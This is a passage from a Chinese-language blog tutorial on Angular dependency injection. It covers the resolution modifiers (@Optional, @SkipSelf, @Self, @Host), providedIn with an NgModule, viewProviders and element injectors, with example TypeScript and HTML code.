</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>这样，我们没有在任何地方提供logger服务，浏览器会报没有提供服务的错：</p> <p><img src="/vuebloger/img/post/20210303102228733.png" alt=""></p> <p>当我们给服务加上@Optional()装饰器：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// logger.component.ts</span>
<span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> loggerservice<span class="token operator">:</span> LoggerService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>在看浏览器日志，原来没有提供服务的错误已经修复：</p> <p><img src="/vuebloger/img/post/2021030310225368.png" alt=""></p> <p>当我们将在组件内providers没有提供服务，而在根模块中提供logger服务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app.module.ts</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token comment">//...</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>LoggerService<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>我们明确知道自身组件没有提供服务时，可以添加@SkipSelf()跳过自身：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">/</span> logger<span class="token punctuation">.</span>component<span class="token punctuation">.</span>ts
<span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">SkipSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> loggerservice<span class="token operator">:</span> LoggerService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>服务依旧可用：</p> <p><img src="/vuebloger/img/post/20210303102337474.png" alt=""></p> <p>@Self()同理，当明确知道只需要在自身组件内找服务时使用。</p> <div class="custom-block tip"><p class="custom-block-title">对于@Self()与@Host()的区别，官网有这么一句话</p> <p>@Host()会禁止在宿主组件以上的搜索。宿主组件通常就是请求该依赖的那个组件。 不过，当该组件投影进某个父组件时，那个父组件就会变成宿主。</p></div> <p>我们使用投影来解释下这个区别。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// ng g c components/logger/logger-content -s -t</span>
<span class="token comment">// logger.component.ts</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-logger'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  &lt;div&gt;
    &lt;p&gt;logger works!&lt;/p&gt;
    &lt;ng-content&gt;&lt;/ng-content&gt;
  &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>LoggerService<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>调用logger-content组件：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>app-logger</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>app-logger-content</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>app-logger-content</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>app-logger</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>上面以内容投影的方式将logger-content组件引入到logger组件，并只在logger组件提供服务。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// logger-content.component.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">LoggerContentComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token comment">// 使用@Host()装饰器</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">Host</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> loggerservice<span class="token operator">:</span> LoggerService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>loggerservice<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'logger-content 组件打印的内容！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>通过@Host()，我们是可以获取到logger-service的，即用@Host()依然能访问父组件的ElementInjector。</p> <p>我们知道，如果logger-content组件不是通过投影的方式引入，app-logger-content就是它的宿主。但是通过投影方式引入，引入它的组件就是它的宿主。（不太确定这样的说法是否正确，但通过@Host()装饰器的解释，或许可以这样理解）</p> <p>其实一般情况下，@Host()可以完全替换@Self()的，他们之间的区别真的很微妙。</p> <h3 id="指定ngmodule注入"><a href="#指定ngmodule注入" class="header-anchor">#</a> 指定NgModule注入</h3> <p>之前providedIn: 'root'指定从根模块中提供该服务，其实也可以像下面这样指定其它模块提供该服务。（这里有个前提：我们是将logger组件分配到ComponentsModule模块的）</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// logger.service.ts</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ComponentsModule
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>如果这么做，意味着这个服务无法在模块该模块内部使用，编辑器会报一个循环依赖的警告：</p> <p><img src="/vuebloger/img/post/20210303102403991.png" alt=""></p> <p>浏览器也会报错：</p> <p><img src="/vuebloger/img/post/20210303102419110.png" alt=""></p> <p>所以，只能在其它引入了ComponentsModule的NgModule中，才能使用该服务。其实我们可以根模块注册一个总的服务入口，然后就不用每个在子模块都注入了，只需要声明服务的地方把providedIn指向他即可。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AppComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./app.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>CoreModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/core/core.module'</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>
    AppComponent
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    CoreModule <span class="token comment">// &lt;------------------------------------   👈 这里</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
<span class="token comment">// core.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NoFoundComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'layout/404/404.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>SharedModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/shared/shared.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">,</span> SkipSelf<span class="token punctuation">,</span> Optional<span class="token punctuation">,</span> <span class="token constant">APP_INITIALIZER</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BrowserModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">NZ_I18N</span><span class="token punctuation">,</span> zh_CN<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ng-zorro-antd'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HashLocationStrategy<span class="token punctuation">,</span> LocationStrategy<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpClientModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>RouteReuseStrategy<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>RoutesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../routes/routes.module'</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>NoFoundComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    BrowserModule<span class="token punctuation">,</span>
    BrowserAnimationsModule<span class="token punctuation">,</span>
    HttpClientModule<span class="token punctuation">,</span>
    SharedModule<span class="token punctuation">,</span>
    ServicesModule<span class="token punctuation">,</span> <span class="token comment">// &lt;------------------------------------ 👈  这里</span>
    RoutesModule
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  exports<span class="token operator">:</span> <span class="token punctuation">[</span>
    SharedModule<span class="token punctuation">,</span>
    RoutesModule
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CoreModule</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">SkipSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> parentModule<span class="token operator">:</span> CoreModule</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>parentModule<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'CoreModule 只能被appModule引入'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// service.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">,</span> InjectionToken<span class="token punctuation">,</span> <span class="token constant">PLATFORM_ID</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>environment<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../../environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BaseInterceptor<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/interceptor/base.interceptor'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>isPlatformBrowser<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">API_CONFIG</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token punctuation">(</span><span class="token string">'ApiConfigToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">WINDOW</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token punctuation">(</span><span class="token string">'windowToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">API_CONFIG</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> environment<span class="token punctuation">.</span>production <span class="token operator">?</span> <span class="token string">'/'</span> <span class="token operator">:</span> <span class="token string">'/api/'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
      provide<span class="token operator">:</span> <span class="token constant">WINDOW</span><span class="token punctuation">,</span> <span class="token function">useFactory</span><span class="token punctuation">(</span><span class="token parameter">platformId<span class="token operator">:</span> object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">isPlatformBrowser</span><span class="token punctuation">(</span>platformId<span class="token punctuation">)</span> <span class="token operator">?</span> window <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      deps<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">PLATFORM_ID</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> BaseInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ServicesModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
<span class="token comment">// course-manage.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Injectable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/services/http.service'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ServicesModule <span class="token comment">// &lt;------------------------------------ 👈  直接注入，全局可用</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CourseManageService</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> http<span class="token operator">:</span> HttpService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span>
<span class="token comment">// school-zone.component.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">SchoolZoneComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span><span class="token punctuation">,</span> ControlValueAccessor <span class="token punctuation">{</span>
   <span class="token operator">...</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
    <span class="token parameter"><span class="token keyword">private</span> courseMgService<span class="token operator">:</span> CourseManageService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// &lt;---------------- 👈  组件中直接使用</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br></div></div><h3 id="viewproviders"><a href="#viewproviders" class="header-anchor">#</a> viewProviders</h3> <p>使用 viewProviders数组是在 @Component()装饰器中提供服务的另一种方法。</p> <p>组件会从自身开始寻找服务，然后遍历父组件的ElementInjector，直到找到。viewProviders也有这个特性，区别是，对投影内容不可见。</p> <p>viewProviders的修饰符与providers的修饰符用法一致。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>app-logger</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>app-logger-content</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>app-logger-content</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>app-logger</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>LoggerContentComponent无法找到LoggerComponent里用viewProviders提供的服务。总的来说：</p> <ol><li>Angular提供两个注入器层次结构：ModuleInjector层次结构及ElementInjector层次结构；</li> <li>服务查找规则可以通俗的理解为‘就近原则’；</li> <li>通过配置不同的解析修饰符，可以对程序进行一定程度的优化；</li> <li>viewProviders对投影内容不可见。</li></ol> <p>接下来我们看下多级元素注入器</p> <h3 id="元素注入器"><a href="#元素注入器" class="header-anchor">#</a> 元素注入器</h3> <p>当你延迟加载模块时，Angular 会创建多级模块注入器。多级组件注入器是由模板中嵌套组件创建的，就内部实现而言，组件注入器也可称为视图注入器。多级元素注入器在依赖注入系统的起始阶段就使用了。这些多级元素注入器被用来解析由 @Host 装饰的依赖。</p> <h3 id="一个元素注入器"><a href="#一个元素注入器" class="header-anchor">#</a> 一个元素注入器</h3> <p>Angular 内部使用一种叫视图或组件视图的数据结构来表示组件。视图对象主要用来表示组件模板中由 HTML 元素创建的 DOM 节点的集合。@angular/compiler 会编译你写的组件，生成的结果由 ViewDefinition 接口来表示，写的带有 @Component 装饰的类不编译为新的类是无法直接运行的，且 HTML 模板就存在于新类的属性里，即 Compile HTML+Class into New Class。正因为 @angular/compiler 编译功能强大，所以可以在 HTML 模板里写很多不符合 HTML 语法的 HTML 代码，比如绑定指令等等）。</p> <p>所以，每一个视图对象内部是由不同种类视图节点组成的。ViewDefinition 表示编译后的视图对象，视图又是由节点组成的，@angular/core 使用 NodeDef 接口来表示所有节点，而节点又分很多种，使用 NodeFlags 来表示，其中最常见的 TypeElement 类型就是来标识 HTML 元素，使用 ElementDef 接口来表示），最常用的视图节点类型是元素节点，用来表示对应的 DOM 元素，下图表示视图和 DOM 两者之间的关系：</p> <p><img src="/vuebloger/img/post/v2-3d5af759ff7e86c45d05820d5b8e98ad_720w.jpg" alt=""></p> <p>每一个视图节点都是由节点定义对象实例化后创建的，节点定义对象包含描述节点的元数据。比如，像 element 类型的节点通常用来表示 DOM 元素，而这些元数据是由 @angular/compiler 的编译器编译组件模板和附着在模板上的指令生成的。</p> <p>在Angular中，描述HTML元素的节点定义定义了它自己的注入器。换句话说，组件模板中的HTML元素定义了自己的元素注入器。这个注入器可以通过在相应的HTML元素上应用一个或多个指令来填充提供者。我们看示例,假设组件模板中有个 div 元素，并且有两个指令挂载到上面：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div a b&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span> selector<span class="token operator">:</span> <span class="token string">'[a]'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ADirective</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span> selector<span class="token operator">:</span> <span class="token string">'[b]'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">BDirective</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>@angular/compiler 的编译器会编译模板生成视图，该视图中 DOM 元素 div 对应的元素节点定义对象包含如下元数据：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> DivElementNodeDefinition <span class="token operator">=</span> <span class="token punctuation">{</span>
    element<span class="token operator">:</span> <span class="token punctuation">{</span>
        name<span class="token operator">:</span> <span class="token string">'div'</span><span class="token punctuation">,</span>
        publicProviders<span class="token operator">:</span> <span class="token punctuation">{</span>
            ADirective<span class="token operator">:</span> referenceToADirectiveProviderDefinition<span class="token punctuation">,</span>
            BDirective<span class="token operator">:</span> referenceToBDirectiveProviderDefinition
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>正如你所见，节点对象定义了 element.publicProviders 属性，包含两个服务提供者 ADirective 和 BDirective，该属性作用类似于一个注入器，而 referenceToADirectiveProviderDefinition 和 referenceToBDirectiveProviderDefinition 就是附着在 div 元素上两个指令的实例。由于它们是由同一个元素注入器解析，所以 你可以把其中一个指令注入到另一个指令中。当然，你不能在两个指令中相互注入依赖，因为这会导致依赖死锁。下图说明了我们现在拥有的东西：</p> <p><img src="/vuebloger/img/post/v2-ec62889fbff8b2a983e6aa2f0f6e617f_720w.jpg" alt=""></p> <p>注意宿主元素 app-comp 存在于 AppComponentView 之外，因为它是属于父组件视图内的。</p> <p>现在如果 ADirective 也包含服务提供者会发生什么？</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'[a]'</span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token punctuation">[</span>ADirService<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ADirective</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>正如你所料，这个服务会被包含进由 div 创建的元素注入器里：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> divElementNodeDefinition <span class="token operator">=</span> <span class="token punctuation">{</span>
    element<span class="token operator">:</span> <span class="token punctuation">{</span>
        name<span class="token operator">:</span> <span class="token string">'div'</span><span class="token punctuation">,</span>
        publicProviders<span class="token operator">:</span> <span class="token punctuation">{</span>
            ADirService<span class="token operator">:</span> referenceToADirServiceProviderDefinition
            ADirective<span class="token operator">:</span> referenceToADirectiveProviderDefinition<span class="token punctuation">,</span>
            ADirective<span class="token operator">:</span> referenceToADirectiveProviderDefinition
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>再一次放图，下图是现在的结果：</p> <p><img src="/vuebloger/img/post/v2-8a7545081fe00465f9f36a8d3e29c469_720w.jpg" alt=""></p> <h3 id="多级元素注入器"><a href="#多级元素注入器" class="header-anchor">#</a> 多级元素注入器</h3> <p>嵌套 HTML 元素组成了 DOM 元素层级，组件视图内的这些 DOM 元素组成了 Angular 依赖注入系统内多级元素注入器。
